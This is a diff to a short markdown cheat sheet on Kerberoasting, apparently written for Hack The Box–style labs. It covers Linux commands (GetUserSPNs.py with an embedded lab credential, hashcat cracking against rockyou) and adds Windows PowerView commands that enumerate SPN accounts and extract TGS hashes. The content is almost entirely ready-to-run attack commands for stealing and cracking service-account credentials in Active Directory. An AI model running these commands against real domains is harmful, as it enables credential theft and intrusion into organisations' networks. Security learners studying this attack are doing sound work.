@@ -1,4 +1,5 @@
 # Kerberosting
+## Linux
 Kerberoasting is an attack technique used to obtain service account credentials by abusing the Kerberos authentication protocol. The attack is based on requesting Ticket Granting Service (TGS) tickets for accounts that have a Service Principal Name (SPN) associated with them.
 
 To perform this attack, a valid domain user account is required:
@@ -22,4 +23,19 @@ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request > admin.ha
 Finally, the extracted hash is cracked using a dictionary attack:
 ```
 hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
+```
+
+## Windows
+Preparing the system
+```
+Import-Module .\PowerView.ps1
+```
+Get usernames
+```
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+Get-DomainUser * -spn | select samaccountname
+```
+Get the hash
+```
+Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash
 ```
